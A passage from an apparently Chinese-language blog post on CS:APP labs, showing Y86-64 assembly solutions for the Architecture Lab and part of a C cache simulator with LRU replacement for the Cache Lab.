class="line"></span><br><span class="line"></span><br><span class="line"># Sample linked list</span><br><span class="line">.align 8</span><br><span class="line">ele1:</span><br><span class="line">.quad 0x00a</span><br><span class="line">.quad ele2</span><br><span class="line">ele2:</span><br><span class="line">.quad 0x0b0</span><br><span class="line">.quad ele3</span><br><span class="line">ele3:</span><br><span class="line">.quad 0xc00</span><br><span class="line">.quad 0</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">irmovq ele1, %rdi</span><br><span class="line">call sum_list         # sum_list(list_ptr ls)</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">sum_list:</span><br><span class="line">xorq %rax, %rax       # val &#x3D; 0</span><br><span class="line">jmp loop1             # goto loop1</span><br><span class="line"></span><br><span class="line">loop:</span><br><span class="line">mrmovq 0(%rdi),%rsi   # get ls-&gt;val</span><br><span class="line">addq %rsi, %rax       # val +&#x3D; ls-&gt;val</span><br><span class="line">mrmovq 8(%rdi),%rsi   # get ls-&gt;next</span><br><span class="line">rrmovq %rsi,%rdi  # ls &#x3D; ls-&gt;next</span><br><span class="line"></span><br><span class="line">loop1:</span><br><span class="line">andq %rdi, %rdi       # and $rdi</span><br><span class="line">jne loop              # if !&#x3D; 0 goto loop</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">#Stack starts here and grows to lower addresses</span><br><span class="line">.pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#rsum.ys</span><br><span class="line">#Execution begins at address 0</span><br><span class="line">.pos 0</span><br><span class="line">irmovq stack, %rsp    # set up stack pointer</span><br><span class="line">call main             # Execute main program</span><br><span class="line">halt  # Terminate program</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Sample linked list</span><br><span class="line">.align 8</span><br><span class="line">ele1:</span><br><span class="line">.quad 0x00a</span><br><span class="line">.quad ele2</span><br><span class="line">ele2:</span><br><span class="line">.quad 0x0b0</span><br><span class="line">.quad ele3</span><br><span class="line">ele3:</span><br><span class="line">.quad 0xc00</span><br><span class="line">.quad 0</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">irmovq ele1, %rdi</span><br><span class="line">call rsum_list         # rsum_list(list_ptr ls)</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">rsum_list:</span><br><span class="line">pushq %r12</span><br><span class="line">xorq %rax, %rax        # val &#x3D; 0</span><br><span class="line">andq %rdi, %rdi        </span><br><span class="line">je return              # if &#x3D;&#x3D; 0 goto return</span><br><span class="line">mrmovq 0(%rdi), %r12   # get ls-&gt;val</span><br><span class="line">mrmovq 8(%rdi), %rdi   # get ls-&gt;next</span><br><span class="line">call rsum_list         # call rsum_list</span><br><span class="line">addq %r12, %rax        # val + rest</span><br><span class="line">return:</span><br><span class="line">popq %r12</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">#Stack starts here and grows to lower addresses</span><br><span class="line">.pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#rsum.ys</span><br><span class="line">#Execution begins at address 0</span><br><span class="line">.pos 0</span><br><span class="line">irmovq stack, %rsp    # set up stack pointer</span><br><span class="line">call main             # Execute main program</span><br><span class="line">halt  # Terminate program</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Sample linked list</span><br><span class="line">.align 8</span><br><span class="line">src:</span><br><span class="line">.quad 0x00a</span><br><span class="line">.quad 0x0b0</span><br><span class="line">.quad 0xc00</span><br><span class="line"># Destination block</span><br><span class="line">dest:</span><br><span class="line">.quad 0x111</span><br><span class="line">.quad 0x222</span><br><span class="line">.quad 0x333</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">irmovq src, %rdi</span><br><span class="line">irmovq dest, %rsi</span><br><span class="line">irmovq $3, %rdx</span><br><span class="line">call copy_block         # copy_block(long *src, long *dest, long len)</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">copy_block:</span><br><span class="line">irmovq $1, %r13</span><br><span class="line">irmovq $8, %r14</span><br><span class="line">xorq %rax, %rax        # result &#x3D; 0</span><br><span class="line">jmp loop1</span><br><span class="line"></span><br><span class="line">loop:</span><br><span class="line">mrmovq 0(%rdi), %r12</span><br><span class="line">addq %r14, %rdi</span><br><span class="line">rmmovq %r12, (%rsi)</span><br><span class="line">addq %r14, %rsi</span><br><span class="line">xorq %r12, %rax</span><br><span class="line">subq %r13, %rdx</span><br><span class="line">loop1:</span><br><span class="line">andq %rdx, %rdx</span><br><span class="line">jg loop</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">#Stack starts here and grows to lower addresses</span><br><span class="line">.pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure><h4 id="PartB"><a href="#PartB" class="headerlink" title="PartB"></a>PartB</h4><p>按照 <code>iaddq</code> 的属性在 <code>sim/seq/seq-full.hcl</code> 中特定的位置添加 “IIADDQ” 即可</p><h3 id="Cache-Lab"><a href="#Cache-Lab" class="headerlink" title="Cache Lab"></a>Cache Lab</h3><blockquote><p>推荐阅读：</p><p><a href="https://www.bilibili.com/video/BV1rE41127Re?p=41">https://www.bilibili.com/video/BV1rE41127Re?p=41</a></p></blockquote><h4 id="Part-A-1"><a href="#Part-A-1" class="headerlink" title="Part A"></a>Part A</h4><p>在<code>csim.c</code>中写一个Cache，使用LRU替换策略。我们目的就是实现一个功能和<code>csim-ref</code>一样的程序。其实预至的<code>csim-ref</code>是没有脱符号表的…</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20200730141947.jpeg" alt="Cache结构"></p><blockquote><p>数据访问：</p><ul><li>L：Load，数据载入，可能发生1次miss</li><li>S：Store，可能发生1次miss</li><li>M：store后再load，两次访存。1 miss &amp; 1 hit + 可能eviction</li></ul></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;cachelab.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">char</span> valid_bit;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> tag;</span><br><span class="line"><span class="keyword">int</span> LRU_count;</span><br><span class="line">&#125; Cache_line;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">Cache_line* lines;</span><br><span class="line">&#125; Cache_set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> S;</span><br><span class="line"><span class="keyword">int</span> E;</span><br><span class="line">Cache_set* sets;</span><br><span class="line">&#125; Cache;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> hit_count=<span class="number">0</span>, miss_count=<span class="number">0</span>,eviction_count=<span class="number">0</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">s -- the number of sets</span></span><br><span class="line"><span class="comment">E -- the number of cache lines in one set</span></span><br><span class="line"><span class="comment">b -- the size of one block in one cache line</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printUsage</span><span class="params">(<span class="keyword">char</span>* argv[])</span></span>;  <span class="comment">//print the help messages</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initCache</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> E, <span class="keyword">int</span> b, Cache* cache)</span></span>; <span class="comment">//init caches</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freeCache</span><span class="params">(Cache* cache)</span></span>; <span class="comment">//free caches</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getHitIndex</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag)</span></span>; <span class="comment">// if hit return the index of memory</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getEmptyIndex</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag)</span></span>; <span class="comment">// if there is any empty memort return it&#x27;s index</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">load</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag, <span class="keyword">int</span> verbosity)</span></span>; <span class="comment">//load </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">store</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag, <span class="keyword">int</span> verbosity)</span></span>; <span class="comment">//store</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">modify</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag, <span class="keyword">int</span> verbosity)</span></span>; <span class="comment">//modify: once store and once load </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">replayTrace</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> E, <span class="keyword">int</span> b, <span class="keyword">char</span>* buf, <span class="keyword">int</span> verbosity, Cache* cache)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> s, E, b;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];   <span class="comment">//store the name of the file</span></span><br><span class="line"><span class="keyword">int</span> verbosity = <span class="number">0</span>;</span><br><span class="line">Cache cache;</span><br><span class="line"><span class="keyword">char</span> ch;</span><br><span class="line"><span class="keyword">while</span> ((ch = getopt(argc, argv, <span class="string">&quot;vs:E:b:t:&quot;</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line"><span class="keyword">switch</span> (ch) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">verbosity = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">s = atoi(optarg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">E = atoi(optarg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">b = atoi(optarg);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">printUsage(argv);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line"><span class="built_in">strcpy</span>(buf, optarg);<span class="comment">//copy the address of trace to file</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( !s || !E || !b ) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s: Missing required command line argument\n&quot;</span>, *argv);</span><br><span class="line">printUsage(argv);</span><br><span class="line">&#125;</span><br><span class="line">initCache(s, E, b, &amp;cache);</span><br><span class="line">replayTrace(s, E, b, buf, verbosity, &amp;cache);</span><br><span class="line">freeCache(&amp;cache);</span><br><span class="line">printSummary(hit_count, miss_count, eviction_count);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printUsage</span><span class="params">(<span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: %s [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;\n&quot;</span>, *argv);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Options:&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;  -h         Print this help message.&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;  -v         Optional verbose flag.&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;  -s &lt;num&gt;   Number of set index bits.&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;  -E &lt;num&gt;   Number of lines per set.&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;  -b &lt;num&gt;   Number of block offset bits.&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;  -t &lt;file&gt;  Trace file.&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\nExamples:&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;  linux&gt;  %s -s 4 -E 1 -b 4 -t traces/yi.trace\n&quot;</span>, *argv);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;  linux&gt;  %s -v -s 8 -E 2 -b 4 -t traces/yi.trace\n&quot;</span>, *argv);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initCache</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> E, <span class="keyword">int</span> b, Cache* cache)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cache-&gt;S = <span class="built_in">pow</span>(<span class="number">2.0</span>, s); <span class="comment">// get the sets</span></span><br><span class="line">cache-&gt;E = E;</span><br><span class="line">cache-&gt;sets = (Cache_set*)<span class="built_in">malloc</span>(cache-&gt;S * <span class="keyword">sizeof</span>(Cache_set));</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; cache-&gt;S; i++) &#123;<span class="comment">//init every cache line</span></span><br><span class="line">cache-&gt;sets[i].lines = (Cache_line*)<span class="built_in">malloc</span>(E * <span class="keyword">sizeof</span>(Cache_line));</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; cache-&gt;E; j++) </span><br><span class="line">&#123;<span class="comment">//init every cache line</span></span><br><span class="line">cache-&gt;sets[i].lines[j].valid_bit = <span class="number">0</span>;</span><br><span class="line">cache-&gt;sets[i].lines[j].LRU_count = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freeCache</span><span class="params">(Cache* cache)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;S; i++) &#123;<span class="comment">//init every cache line</span></span><br><span class="line"><span class="built_in">free</span>(cache-&gt;sets[i].lines); </span><br><span class="line">cache-&gt;sets[i].lines = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(cache-&gt;sets);</span><br><span class="line">cache-&gt;sets = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getHitIndex</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag)</span></span>&#123; <span class="comment">//whether there is a hit</span></span><br><span class="line">    <span class="keyword">int</span> hitIndex = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;E; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cache-&gt;sets[setIndex].lines[i].valid_bit == <span class="number">1</span> &amp;&amp; cache-&gt;sets[setIndex].lines[i].tag == tag)&#123; <span class="comment">// valid and the tag matches</span></span><br><span class="line">            hitIndex = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hitIndex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getEmptyIndex</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag)</span></span>&#123;<span class="comment">//find whether there is an empty line in the given set</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> emptyIndex = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; cache-&gt;E; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cache-&gt;sets[setIndex].lines[i].valid_bit == <span class="number">0</span>) &#123;</span><br><span class="line">            emptyIndex = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> emptyIndex;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">load</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag, <span class="keyword">int</span> verbosity)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> hitIndex = getHitIndex(cache, setIndex, tag);<span class="comment">//whether there is a hit</span></span><br><span class="line">    <span class="keyword">if</span> (hitIndex == <span class="number">-1</span>) &#123; <span class="comment">//one miss</span></span><br><span class="line">        miss_count++;</span><br><span class="line">        <span class="keyword">if</span> (verbosity) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;miss &quot;</span>);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">int</span> emptyIndex = getEmptyIndex(cache, setIndex, tag);     </span><br><span class="line">        <span class="keyword">if</span> (emptyIndex == <span class="number">-1</span>) &#123;<span class="comment">//need eviction </span></span><br><span class="line">            eviction_count++;</span><br><span class="line">            <span class="keyword">if</span> (verbosity)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;eviction &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"><span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;E; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span> (cache-&gt;sets[setIndex].lines[i].LRU_count == cache-&gt;E - <span class="number">1</span> &amp;&amp; flag==<span class="number">1</span>)&#123; <span class="comment">//find the least recent used line, and other line LRU_count++</span></span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].valid_bit = <span class="number">1</span>;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].LRU_count = <span class="number">0</span>;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].tag = tag;</span><br><span class="line">                    flag = <span class="number">0</span>;</span><br><span class="line">                &#125; </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].LRU_count++;<span class="comment">//it is not used this time</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;  <span class="comment">// don&#x27;t need eviction</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;E; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i != emptyIndex)&#123;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].LRU_count++;<span class="comment">//it is not used this time</span></span><br><span class="line">                &#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].valid_bit = <span class="number">1</span>;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].tag = tag;</span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].LRU_count = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line"><span class="keyword">else</span> &#123;<span class="comment">//one hit                        </span></span><br><span class="line">        hit_count++;</span><br><span class="line">        <span class="keyword">if</span> (verbosity)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;hit &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> tempLRU_count = cache-&gt;sets[setIndex].lines[hitIndex].LRU_count;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;E; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i != hitIndex) &#123;</span><br><span class="line">                <span class="keyword">if</span> (cache-&gt;sets[setIndex].lines[i].LRU_count &lt;  tempLRU_count) &#123;<span class="comment">//less than the hit one&#x27;s LRU</span></span><br><span class="line">                    cache-&gt;sets[setIndex].lines[i].LRU_count++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; </span><br><span 